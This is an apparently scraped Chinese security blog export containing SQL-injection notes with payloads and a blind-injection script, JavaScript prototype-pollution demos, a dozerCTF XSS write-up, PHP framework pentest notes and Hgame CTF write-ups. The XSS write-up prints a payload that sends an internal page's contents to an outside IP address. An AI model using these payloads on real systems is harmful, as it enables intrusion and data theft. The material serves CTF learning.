4;--&gt;失败故此表有三列;limit (起始序号(0开始)),(展示行数);待补充… 不常用全局变量select system_user()&lt;==&gt;user() //展示系统用户 select database() //展示数据库名 select version() //展示版本信息 select @@datadir //展示数据储存路径 select @@version_compile_os //展示服务器系统为什么会有1,2,select…类似于（union selcet 1,2,#）的缘故:上例是确定了此表有三列，为想要的数据得到展示，选择第三列来显示;当如（union 1,selcet ~,3#）时数据会出现在第二列; 报错注入XPath语法错误注入extractvalue()extractvalue()：从目标XML中返回包含所查询值的字符串。EXTRACTVALUE (XML_document, XPath_string);第一个参数：XML_document是String格式，为XML文档对象的名称第二个参数：XPath_string (Xpath格式的字符串)concat:返回结果为连接参数产生的字符串。当我们在XPath_string故意填入错误的XPath时，在回显报错的同时会执行XPath的sql语句。可根据此函数进行报错注入 // 这里是为了绕过空格的检测，所以用()把所有的东西包裹起来 // 0x7e是“~”，是sql的一元运算符，可以防止在回显的时候不回显第一组数据 // 可以的话想用0x5e“^”也可以... extractvalue(NULL,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))# extractvalue(NULL,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata))))#UPDATEXML()UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据和上面同理，但需要多加一个NULL 整型溢出错误注入（SQL&lt;5.5.53）select ~0; &gt;&gt;&gt; 18446744073709551615这里我们对0进行了取反，导致数据溢出 select !(select * from (select user())x); &gt;&gt;&gt; 1当一条语句执行成功时，返回0。因此非一下就变成了“1”. select exp(710); &gt;&gt;&gt; ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;这里exp()计算自然指数。到了710就已经溢出了，我们尝试： select exp(~(select*from(select user())x)); &gt;&gt;&gt; DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;虽然报错，但成功返回用户信息。以此来注入。 时间盲注时间盲注在时间盲注中共使用了4个比较重要的语句： sleep(s); # 将语句延迟s秒 if(a,b,c); # 如果a语句成立，执行b，否则执行c ascii(a); # 将语句a的字符转换为ascii(十进制) substr(a,b,c); # 将a的语句，从b(num)的位置开始，截取c(num)个字符我们将其一个一个结合起来就可以得到： select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),?,1))=?),sleep(5),1); # 一一拆分对应 select if(@a,sleep(5),1) #如果@a语句成立，执行sleep(5)，否则返回1 @a=(ascii(@b)=?) #判断ascii后的@b是否等于?中的数字 @b=substr(@c,?,1) #从?处开始，截取@c语句中的1个字符 @c=(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) #查表语句，可以变换为查列，查字段的语句由此，我们可以实现爆破来获得信息这里来一个python脚本(版本&gt;3.0)（十分臃肿 import requests mode = input(&quot;plz input use mode:&quot;) # T查表 C查列 F查字段 while(True): if(mode == &apos;T&apos;): payload = &apos;select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(5),1)&apos; break elif(mode == &apos;C&apos;): tab = input(&apos;plz input tables_name:&apos;) payload = &apos;select if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1)))=%s,sleep(5),1)&apos; break elif(mode == &apos;F&apos;): tab = input(&apos;plz input tables_name:&apos;) col = input(&apos;plz input col_name:&apos;) payload = &apos;select if((ascii(substr((select &apos;+ col +&apos; from &apos;+ tab +&apos; limit 0,1),%s,1))=%s),sleep(5),1)&apos; break elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;): print(&apos;Error&apos;) url = &apos;http://114514.com/FAQ.php&apos; res = &apos;&apos; sel_num = input(&quot;plz input sel_num:&quot;) # 要查询的字符数 for i in range(1,sel_num): print(i) for j in range(32,127): print(chr(j)) now_payload = payload % (i,j) try: r = requests.post(url=url,data=now_payload,timeout=4.5) # 这里视情况更改 except: res += chr(j) print(res)sql堆叠注入原理在一定条件下，我们可以通过 “ ; ” 提前结束sql语句，并在后面跟上其它sql语句，得到执行。在myphpadmin我们便可以这样多句执行比如： $a = $_GET[&apos;a&apos;]; $sql = &quot;SELECT * FROM users WHERE id=$id&quot;;在这里我们甚至可以构造： $a = &quot;1;DELETE FROM users&quot;;将整个users表全部删除！可见其危害有多大不过一般来说，这种注入的局限比较大…可能数据库引擎不支持，权限不足等…都会导致注入失败，还有就是，结果不一定会有回显…yysy,我刚开始我从字面意思以为是什么数据溢出的骚操作（ 应用sql预处理语句在可以进行堆叠注入时，且像”select、or…“等重要语句被过滤时，可以使用sql预处理语句 SET @a=&quot;select * from users&quot;; #怎么说？设定了一个a变量 PREPARE test FROM @a; #使test=@a EXECUTE test; #加载test语句这样，我们就可以执行@a所设定的语句再来，我们将我们的@a所设定的语句转换为hex，即可绕过大多数的waf这里，我们尝试： http://114514.com/?id=1&apos;;SET+@a=0x73656C65637420736C656570283529;PREPARE+test+FROM+@a;EXECUTE+test;&quot; //select sleep(5);bypass - information_schema原理也不是什么奇技淫巧，只是有其它的类似于information_schema的东西可以用来替代。这里先只给出payload，详细原理之后补上。不知其所以然是不行的。 # 无自增id时 select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database(); +---+---+-------------------------------+ | 1 | 2 | group_concat(table_name) | +---+---+-------------------------------+ | 1 | 2 | users,emails,uagents,referers | +---+---+-------------------------------+ # 有自增id时 select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()； +---+---+-------------------------------+ | 1 | 2 | group_concat(table_name) | +---+---+-------------------------------+ | 1 | 2 | emails,referers,uagents,users | +---+---+-------------------------------+https://www.anquanke.com/post/id/193512原作者说，可能还有更多方式，但我现在时间有限。之后再说。 as别名的无列名注入原理通过as和虚拟表来使数据导入至虚拟表并赋予别名，以此在不知道列名的状况下，通过别名窃取到数据。 as语句要了解此注入先需要知道什么是as。其实也简单，它就是为数据起了一个别名。例如，我使用如下语句查询到了以下结果： select * from users; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+这时候，可能有人不懂洋文(比如我)，这时候我们可以用as语句进行转换： select id as 编号,username as 用户名,password as 密码 from users; +--------+-----------+------------+ | 编号 | 用户名 | 密码 | +--------+-----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +--------+-----------+------------+可以发现，id、username、password都变成了中文。 无列名查询但需要注意的是，这并不是在原表修改的，而是产生了一张虚拟表。这使得我们可以不用查列名即可获得数据。这就让我们可以干一些奇怪的事情。注意，这里需要知道表的列数(其实也容易获取) select 1,2,3 as c; # 获得了一张虚拟表，最后列名是c +---+---+---+ | 1 | 2 | c | +---+---+---+ | 1 | 2 | 3 | +---+---+---+ select 1,2,3 as c union select * from users; # 我们发现原有的列名被替换了 +----+----------+------------+ | 1 | 2 | c | +----+----------+------------+ | 1 | 2 | 3 | | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+ # 这时候，我们就可以对这个虚拟表干一些奇怪的事情 select group_concat(c) from (select 1,2,3 as c union select * from users) as b; # 这里是又建立了另一个表，让他查询我们之前导入了数据的虚拟表，便可以提出数据 # 注意，新表一定要起别名，不然会报错(指上面的as b) # 这个太长了，我就在下面放图片了","link":"/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"},{"title":"Hello World!!!","text":"您好！欢迎来到我的博客！","link":"/2020/02/24/Hello-World-0/"},{"title":"js的继承与原型链污染","text":"前言迷迷糊糊终于搞懂了js的面向对象（大概），这里简单记个笔记。 javascipt中的类众所周知，javascript虽然可以进行面向对象编程，但其本身是没有class这一概念的。javascript使用function来实现class这一概念。 123456function o1() { this.test = \"aaa\";}let a = new o1;console.log(a.test); //aaa 即使是有class这一关键词，也只是一个语法糖，其本质还是function 1234567class o1 { constructor() { this.test = \"aaa\"; }};console.log(typeof o1); //function 继承js的继承有多种方法实现，这里只介绍组合继承 原型链对于一个类，它有自己的原型对象Class.prototype，通过prototype关键字访问对于一个类的实例（对象），它可以通过__proto__关键词访问对应的原型对象而关键词constructor是上面两个的逆过程一个原型对象也可以通过__proto__访问父级原型对象总结：prototype 类的关键词，访问对应原型对象__proto__ 对象的关键词，访问对应原型对象constructor 对象的关键词，访问对应的类 下例是一个继承链和构造函数的组合继承 12345678910111213141516function o1(id) { this.id = id;};o1.prototype.sayId = function() { console.log(this.id);}function o2(id, name) { o1.call(this, id); this.name = name;}o2.prototype = new o1();o2.prototype.sayName = function() { console.log(this.name);}o2.prototype.constructor = o2; o2.prototype.constructor = o2 ???请看下例 123456789101112131415161718function o1() { this.o1 = 1;}function o2() { o1.call(this); this.o2 = 2;}o2.prototype = new o1;function o3() { o2.call(this); this.o3 = 3;}o3.prototype = new o2;let test = new o3;console.log(test.constructor == o3); 请猜猜最后输出什么？最开始我认为对象的constructor应该指向自己的构造函数，所以应该是true？但这是不对的，是false！construstor属性也是可以继承的，这样一层一层继承导致o3继承了o1的construstor我这样写继承是错误的，正确的方法应该是这样的，将原型的construstor重新指向自己的构造函数。 123456789101112131415161718192021222324function o1() { this.o1 = 1;}function o2() { o1.call(this); this.o2 = 2;}o2.prototype = new o1;o2.prototype.constructor = o2;function o3() { o2.call(this); this.o3 = 3;}o3.prototype = new o2;o3.prototype.constructor = o3;let test = new o3;console.log(test.constructor == o1); //falseconsole.log(test.constructor == o3); //true 成员属性private对于private属性的成员来说来说，它只可以在构造函数内部使用的时候进行访问。根据let关键词的特性（不会变量提升，可以只在块级作用域作用等），它可以作为private使用。同时，对于私有的方法，可以直接套娃实现。这样的函数无法被实例化的对象调用，也不会被继承。如果它可以被外部访问，那它准确来说是一个protected属性。 12345678910111213141516171819202122232425262728function TheFather() { let a = 1; function private_1() { console.log(\"I am private!\"); return a; }}function son1() { let b = 2; function private_1() { console.log(\"I am private!\"); return b; }}son1.prototype = new TheFather;son1.prototype.constructor = son1;let test1 = new TheFather;//console.log(test1.a); //undefined//console.log(test1.private_1()); //errorlet test2 = new son1;//console.log(test2.a); //undefined//console.log(test2.private_1()); //error//console.log(test2.private_2()); //error public对于public对象，它是可以被外部访问，也可以被继承的。我们只需要用this就可以了 1234567891011121314151617181920212223242526272829303132function TheFather() { this.a = 1; this.public_1 = function() { return this.a; }}TheFather.prototype.public_2 = function() { return this.a;}function son1() { this.b = 2; this.public_3 = function() { return this.b; }}son1.prototype = new TheFather;son1.prototype.constructor = son1;let test1 = new TheFather;//console.log(test1.a); //1//console.log(test1.public_1()); //1//console.log(test1.public_2()); //1let test2 = new son1;//console.log(test2.a); //1//console.log(test2.b); //2//console.log(test2.public_1()); //1//console.log(test2.public_2()); //1//console.log(test2.public_3()); //2 prototype对于prototype，我们要让只有实例化的对象和子类的对象可以访问它。我们没有具体实现的方法，可以将private属性变得可以访问即可。可以使用一个公用函数访问它。 1234567891011121314151617181920212223242526function TheFather() { let a = 1; this.private_1 = function() { return a; }}function son1() { let b = 2; this.private_2 = function() { return b; }}son1.prototype = new TheFather;son1.prototype.constructor = son1;let test1 = new TheFather;//console.log(test1.a); //undefined//console.log(test1.private_1()); //1let test2 = new son1;//console.log(test2.a); //undefined//console.log(test2.private_1()); //error//console.log(test2.private_2()); //error 原型链污染因为js的对象继承是基于原型链的，所以如果把上一层的原型污染了就会导致下层的属性被污染。举个例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//判断是否为一个对象function isObject(a) { if(typeof(a) == \"object\") { return true; } else { return false; }}//对象复制function merge(a, b) { for (var attr in b) { if(isObject(a[attr]) &amp;&amp; isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a}//user父级对象，有一个判断是否为admin的属性function user() { this.IsAdmin = false;};//游客对象，继承user，IsAdmin默认为Falsefunction guest() { this.check = function() { console.log(\"I am guest\"); };};guest.prototype = new user;//管理员对象，继承user，IsAdmin修改为Truefunction admin() { this.check = function() { console.log(\"I am admin\"); };};admin.prototype = new user;admin.prototype.IsAdmin = true;let P1 = new guest;let P2 = new admin;console.log(P1.IsAdmin); //falseconsole.log(P2.IsAdmin); //true//假设这里可以控制json，提交以下数据污染原型userlet o1 = JSON.parse('{\"__proto__\":{\"IsAdmin\":true}}');merge(P1, o1);console.log(P1.IsAdmin); //true","link":"/2020/07/01/js%E7%9A%84%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"title":"dozerCTF - Fake phpminiadmin","text":"前言emmm虽然标题这么说有一点标题党，但我的确从这道CTF中认识到了XSS的作用可不止盗cookie Fake phpminiadmin这道题开始给了一个页面可以执行sql语句。刚开始以为是sql注入之类的，但实际上在上面的一栏中有contact选项。明显是一道和xss有关的题了。 可以xss的点那么首先要找到可以xss的点，尝试在输出sql语句输出的地方插入js语句，发现&lt;&gt;尖括号被过滤了，证明这个地方有鬼。 # 尝试以下语句，被阻拦 select &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;; # 尝试hex绕过，成功弹窗 select 0x3C7363726970743E616C6572742831293C2F7363726970743E;接下来便是该想办法怎么样让机器人执行这里的sql。这里的sql数据使用了post，无法直接将带有弹窗数据的url直接发给机器人。这里我想了两种方法： 利用iframe+xss截图实现。 利用CSRF进行跳转。 首先一是不行的，进行测验，iframe只会在加载完js之后才会进行加载。导致无论如何利用js截图，都只能截到一个白框。看起来只能跳转了。 利用CSRF进行跳转首先机器人是不会对网址进行验证的，故我们可以在自己的vps上安置一个CSRF来对进行一个跳转。不过，在当时我先是利用xss平台来确认一下机器人的cookie什么的，发现机器人的session没有特殊信息，但referrer给了一个特殊的网址：http://127.0.0.1/admin_shark.php,看起来这个内网的连接有东西。这更加证明了我们需要csrf来进行跳转，否则同源策略会阻挡我们获取这个内网连接的源码。这里有一个点，便是admin_shark.php在外网下也可以访问，只不过会被拦截，提示你需要在内网访问。这代表着这个内网的服务器和公网的服务器是同一个（或者是是相同的）数据被放置在了 https://www.afkl.ml/xss.php现在应该还能看到。在当时被安放了这么一组数据： &lt;!DOCTYPE html&gt; &lt;form action=&quot;http://127.0.0.1/sql.php&quot; id=&quot;sql&quot; method=&quot;post&quot;&gt; &lt;input type=text name=&quot;sql&quot; value=&quot;select 0x3C7343724970743E76617220743D6E657720584D4C487474705265717565737428293B742E6F70656E2822474554222C2261646D696E5F736861726B2E706870222C66616C7365293B742E73656E6428293B286E657720496D616765292E7372633D22687474703A2F2F34372E39342E3233392E3139342F3F6F75743D222B62746F6128742E726573706F6E736554657874293B3C2F7343526970543E;&quot; /&gt; &lt;/form&gt; &lt;script&gt; var f = document.getElementById(&quot;sql&quot;); f.submit(); &lt;/script&gt; &lt;h1&gt;it works!&lt;/h1&gt; 本质是是构建了一个表单，下面的js会令其强制POST表单内容(PS:foxfire会弹窗询问是否提交表单，但chrome不会)其中hex后的内容是 &lt;sCrIpt&gt;var t=new XMLHttpRequest();t.open(&quot;GET&quot;,&quot;admin_shark.php&quot;,false);t.send();(new Image).src=&quot;http://47.94.239.194/?out=&quot;+btoa(t.responseText);&lt;/sCRipT&gt; (上面是我的测试vps)在测试vps上开启监听，提交url，静候佳音即可。 flag:Dozerctf{eed8cdc400dfd4ec85dff70a170066b7}PS:可惜当时没有知道beef-xss，知道了这道题就有趣多了（","link":"/2020/06/17/dozerCTF-Fake-phpminiadmin/"},{"title":"php框架入门","text":"php框架入门因为是安全相关，主要是讲解一下: 一个框架中有那些重要的文件和文件夹 运维的粗心会导致哪些问题 框架的类加载机制 前言这是我于2020.11.8的例会分享内容，如有错误还请指正！ 先从文件和文件夹讲起 public/web目录我们先康康不同框架中，public/web文件夹里面有什么东西。 可以看道三个文件夹共有的特征便是——都拥有index.php文件。文件内容都大致如以下伪代码。 1234567891011121314151617181920&lt;?phpdefine(&quot;...&quot;, &quot;...&quot;);//... // 定义了一些常量，例如yii是定义其debug是否开启等...require __DIR__.'/../vendor/autoload.php';// 导入autoload.php来自动加载类，这个之后在讲$config = require '../config/config.php';require ...;// 导入一些其它文件，比如config，引导文件等...(new app($config))-&gt;run();=================$http = (new App())-&gt;http;$response = $http-&gt;run();$response-&gt;send();$http-&gt;end($response);=================...// 启动框架 可见index.php便是整个框架的入口文件了。那么public/web文件夹应该是被作为网站根目录来使用的。 对于渗透人员来说，如果运维人员配置错误，会发生什么？例如以下场景。 Q: 有时候我们会发现，一个网站的主页并不是http://vps.com/，而是http://vps.com/public/，甚至是http://vps.ip/app/public/时，这说明了什么？ A: 很明显，懒狗并没有按照框架的要求将public/web目录设置为网站主目录。这里分开讨论： 对于http://vps.com/public/的情况，运维应该是将框架目录设为了网站主目录，这种情况下，我们就可以根据不同的文件夹去读取在public/web下读不到的东西。 对于http://vps.ip/app1/public/的情况，那就是大奖了。很有可能是以下情况： 12345var--www--app1 -app2 -app3 -... -index.php 在这个服务器上存在多个网站，但运维懒狗到懒到不想为每个目录独立配置服务器，设置了更上一层的目录为网站根目录，还“贴心”设置了index.php引导用户跳转到不同文件夹下的不同目录。对于这种设置，我们就可以读到更多原来读不到的文件。 对于其它的public/web下的其它文件，就说一下yii2下的web/assets文件夹吧。根据官网文档，这个文件夹的作用是如下： 如果资源包放在 Web 不能访问的目录， 当视图注册资源时资源会被拷贝到一个 Web 可访问的目录中， 这个过程称为资源发布。资源包即为那些css/js文件。php将会在assets创建一个资源包文件的链接。 这个功能是默认开启的，但当assets没有www-data的写权限时，yii会爆出无法写入文件的错误，解决途径有两个，一是关闭资源发布，二是给其写权限。如果是没有经验的运维，会老老实实根据yii爆出的错误，给予该文件夹写权限。那么如果有任意目录的文件上传，你知道该上传到哪里了吧？ vendor目录 这个目录里装载了一个框架所需的依赖包，如果开发需要一些包作为辅助时，也会安装到这个文件夹。 这里不得不谈的是php的类加载机制。 autoload.php文件在入口文件中，我们看到，其导入了vendor/autoload.php文件，而其又导入了composer/autoload_real.php文件。我们来看看autoload_real.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// autoload_real.php @generated by Composerclass ComposerAutoloaderInite66911f1406e2749477b48d048bd8aca{ // 加载器 private static $loader; // 加载加载器文件 public static function loadClassLoader($class) { if ('Composer\\Autoload\\ClassLoader' === $class) { require __DIR__ . '/ClassLoader.php'; } } // 获取加载器 /** * @return \\Composer\\Autoload\\ClassLoader */ public static function getLoader() { // 单例模式 if (null !== self::$loader) { return self::$loader; } // 平台检查 require __DIR__ . '/platform_check.php'; // 调用方法获取加载器 spl_autoload_register(array('ComposerAutoloaderInite66911f1406e2749477b48d048bd8aca', 'loadClassLoader'), true, true); self::$loader = $loader = new \\Composer\\Autoload\\ClassLoader(); spl_autoload_unregister(array('ComposerAutoloaderInite66911f1406e2749477b48d048bd8aca', 'loadClassLoader')); // 当符合以下条件，就使用静态初始化，否则使用接口初始化 $useStaticLoader = PHP_VERSION_ID &gt;= 50600 &amp;&amp; !defined('HHVM_VERSION') &amp;&amp; (!function_exists('zend_loader_file_encoded') || !zend_loader_file_encoded()); if ($useStaticLoader) { require __DIR__ . '/autoload_static.php'; call_user_func( \\Composer\\Autoload\\ComposerStaticInite66911f1406e2749477b48d048bd8aca::getInitializer($loader) ); } else { $map = require __DIR__ . '/autoload_namespaces.php'; foreach ($map as $namespace =&gt; $path) { $loader-&gt;set($namespace, $path); } $map = require __DIR__ . '/autoload_psr4.php'; foreach ($map as $namespace =&gt; $path) { $loader-&gt;setPsr4($namespace, $path); } $classMap = require __DIR__ . '/autoload_classmap.php'; if ($classMap) { $loader-&gt;addClassMap($classMap); } } // 对加载器进行注册 // 其内部的大致流程是: classMap-&gt;psr-4-&gt;psr-0 $loader-&gt;register(true); // 对辅助函数类直接进行加载 if ($useStaticLoader) { $includeFiles = Composer\\Autoload\\ComposerStaticInite66911f1406e2749477b48d048bd8aca::$files; } else { $includeFiles = require __DIR__ . '/autoload_files.php'; } foreach ($includeFiles as $fileIdentifier =&gt; $file) { // 直接加载 composerRequiree66911f1406e2749477b48d048bd8aca($fileIdentifier, $file); } // 返回加载器 return $loader; }}function composerRequiree66911f1406e2749477b48d048bd8aca($fileIdentifier, $file){ if (empty($GLOBALS['__composer_autoload_files'][$fileIdentifier])) { require $file; $GLOBALS['__composer_autoload_files'][$fileIdentifier] = true; }} 可以看到，php的自动类加载遵循了psr-4规范。 对于java来说，当一个文件存在多个类时，会自动将多出来的类放入新的class文件内，而不是两个类共存同一个文件。而php的标准对于这个就无能为力了。 在WMCTF2020中有一道webweb的反序列化链便存在这个问题。 1234567891011121314// ws.php // Agent.php&lt;?phpnamespace CLI;class WS { //...}class Agent { //... public function __destruct() { // 危险代码 }} 这道题使用fatfree框架，我们的起点__destruct在CLI\\Agent下，但此类和CLI\\WS共存在ws.php上，根据上面的加载规则，Agent类是加载不到的。 这是这个题的一个坑点，如果我们想要加载这个类，就要提前去导入ws.php。做法也简单，在整个payload外层包裹一层CLI\\WS即可。这样，类加载器会根据最外层的CLI\\WS一类，首先导入ws.php，然后解析器会同时解析CLI\\WS和CLI\\Agent，再导入CLI\\Agent类时，就成功了。 其它还有一些零散的文件可以注意一下，这里简单进行一个概况 如果出现了在上面public文件夹出现的问题可以注意一下: .env 系统环境变量，可能会有数据库地址和密码，以及类似于laravel中的密钥 README.md 获得框架名称、版本，以便对框架进行代码审计 composer.lock 获得当前框架所有依赖名 如果当前目录下有assets文件夹，大概率是yii2框架 最后感谢懒狗运维\\开发给我们饭恰(bushi)","link":"/2020/11/15/php%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"},{"title":"不完整的Hgame2020-CTF的WP","text":"2020-杭电HgameWP2020年Hgame比赛WP由于我过于菜鸡，只能打到week2了…orz [TOC] week-1Cosmos 的博客考察点/.git信息泄露 过程在首页中提示了出题人在github上保存了原代码。尝试访问http://cosmos.hgame.n3ko.co/.git/config。得到项目保存的地址。最后在https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc/commit/f79171d9c97a1ab3ea6c97b3eb4f0e1551549853的历史记录中得到base64后的flag。 hgame{g1t_le@k_1s_danger0us_!!!!}接 头 霸 王考察点请求头 过程类似于2019极客大挑战的 神秘的三叶草 一题。但值得注意的是，这道题还考察了一个请求参数If-Unmodified-Since:&lt;time&gt;简单来说，这个参数的作用是进行一个判断： 如果 (在`&lt;time&gt;`时间点之后，文件没有被修改) 则 下载文件 否则 返回412错误还有一个比较相似的参数If-Modified-Since:&lt;time&gt;和If-Unmodified-Since:&lt;time&gt;是反着来的： 如果 (在`&lt;time&gt;`时间点之后，文件修改过了) 则 下载文件 否则 返回304错误在这道题只需将请求头修改即可： POST http://kyaru.hgame.n3ko.co/ HTTP/1.1 Host: kyaru.hgame.n3ko.co Referer: https://vidar.club X-Forwarded-For: 127.0.0.1 User-Agent: Cosmos/114514 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 If-Unmodified-Since: Fri, 01 Jan 1077 00:00:00 GMT Content-Length: 0PS:这道题最开始使用GET请求即可，但后面不知道为什么又改成了POST hgame{W0w!Your_heads_@re_s0_many!}PSS:至于为什么一定是If-Unmodified-Since…可能只是出题人单纯检测了一下请求？亦或者是其它方式？好奇后端是怎么实现的… Code World考察点响应 过程初次打开返回了403，页面为new.php，且打开比较慢，便怀疑有页面重定向。尝试抓包发现果然如此，并提示了405错误。说明请求方式有误，尝试POST请求。请求后出现这样一段话(已格式化)： &lt;center&gt; &lt;h1&gt;人鸡验证&lt;/h1&gt; &lt;br&gt; &lt;br&gt; 目前它只支持通过url提交参数来计算两个数的相加，参数为a &lt;br&gt; &lt;br&gt; 现在,需要让结果为10 &lt;/center&gt;则提交： POST http://codeworld.hgame.day-day.work/?a=5%2B5 HTTP/1.1 Host: codeworld.hgame.day-day.work User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1即可获得flag这里需要注意的是，一般浏览器里会把+认为是空格，这时候提交%2B即可。 hgame{C0d3_1s_s0_S@_sO_C0ol!}🐔尼泰玫考察点抓包改包(js代码审计) 方法一在游戏过程中进行抓包，发现了一条奇怪的请求 POST http://cxk.hgame.wz22.cc/submit HTTP/1.1 Host: cxk.hgame.wz22.cc User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 42 score=400|68ae153a367158c60103d39d867c365a这里score=400便是我这次游戏的分数，后面的一串数据之后的代码审计解释。我们进行改包，将400改为他所要求的30000便会得到alert的flag了。 hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}方法二这里我们对游戏的js代码进行审计在game.js中发现这样一段（已格式化） gameOver() { let po = &quot;ejIy&quot;; let rt = po + &quot;LmNj&quot;; let rou = &quot;L3N1Ym&quot;; let sche = &quot;aHR0c&quot;; let k = &quot;c2Nv&quot;; let me = sche + &quot;DovL2N&quot;; clearInterval(this.timer) this.context.clearRect(0, 0, this.canvas.width, this.canvas.height) let stamp = md5(Date.parse(new Date()) / 1000); this.globalScore = this.globalScore + this.storageScore; this.context.font = &apos;32px Microsoft YaHei&apos; this.context.fillStyle = &apos;#000&apos; this.context.fillText(&apos;CXK，你球掉了！得分：&apos; + this.globalScore, 404, 226) $(&quot;#ballspeedset&quot;).removeAttr(&quot;disabled&quot;); let s = this.globalScore; ( function () { let getU = me + &quot;4ay5oZ&quot;; let rl = getU + &quot;2FtZS53&quot;; let te = rou + &quot;1pdA&quot;; let ey = k + &quot;cmU=&quot;; $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) } )(); this.globalScore = 0; }其中 let po = &quot;ejIy&quot;; let rt = po + &quot;LmNj&quot;; let rou = &quot;L3N1Ym&quot;; let sche = &quot;aHR0c&quot;; let k = &quot;c2Nv&quot;; let me = sche + &quot;DovL2N&quot;; let getU = me + &quot;4ay5oZ&quot;; let rl = getU + &quot;2FtZS53&quot;; let te = rou + &quot;1pdA&quot;; let ey = k + &quot;cmU=&quot;; $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) //其中(长见识了（（（) //rl=getUrl, rt=port, te=route, ey=key //base64解码后发现完整的post方法为 $.post(&quot;http://cxk.hgame.wz22.cc/submit&quot;, &quot;score&quot; + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) //即向 http://cxk.hgame.wz22.cc/submit 发送数据score=s|stamp，之后返回的数据会以alert的形式输出 //其中s为我们的游戏分数 //stamp为 let stamp = md5(Date.parse(new Date()) / 1000); 在分析完代码后，我们便可以修改js源码，伪造数据，获得flag hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}week-2Cosmos的博客后台考察点逻辑漏洞一些php的函数缺陷 过程在最开始可以得到一个登录页面。随即可以发现url疑似可以进行文件包含。http://cosmos-admin.hgame.day-day.work/index.php?action=login.php将login.php替换为根目录下的/flag返回了Hacker get out应该是被过滤了。尝试用php伪协议中的php://filter/read来进行php源码的读取。得到login.php和index.php的源码。在login.php源码里顺藤摸瓜得到了admin.php文件源码。在其中还知道了一个config.php文件，但被过滤了，无法读取。PS：方便起见这里只展示php源码。 login.php &lt;?php include &quot;config.php&quot;; session_start(); //Only for debug if (DEBUG_MODE){ if(isset($_GET[&apos;debug&apos;])) { $debug = $_GET[&apos;debug&apos;]; if (!preg_match(&quot;/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/&quot;, $debug)) { die(&quot;args error!&quot;); } eval(&quot;var_dump($$debug);&quot;); } } if(isset($_SESSION[&apos;username&apos;])) { header(&quot;Location: admin.php&quot;); exit(); } else { if (isset($_POST[&apos;username&apos;]) &amp;&amp; 